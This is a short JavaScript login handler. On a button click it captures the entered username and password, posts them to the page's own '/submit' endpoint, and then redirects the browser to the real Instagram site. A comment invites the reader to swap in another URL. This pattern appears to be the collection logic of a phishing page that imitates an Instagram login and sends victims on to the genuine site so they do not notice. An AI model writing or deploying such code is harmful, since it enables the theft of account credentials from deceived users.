document.querySelector('.log-in-button').addEventListener('click', (e) => {
    e.preventDefault();

    const username = document.querySelector('input[type="text"]').value;
    const password = document.querySelector('input[type="password"]').value;

    fetch('/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({ username, password }),
    })
        .then((response) => response.text())
        .then((data) => {
            // Redirect to a website (replace with your desired URL)
            window.location.href = 'https://www.instagram.com/';
        })
        .catch((error) => {
            console.error('Error:', error);
        });
});
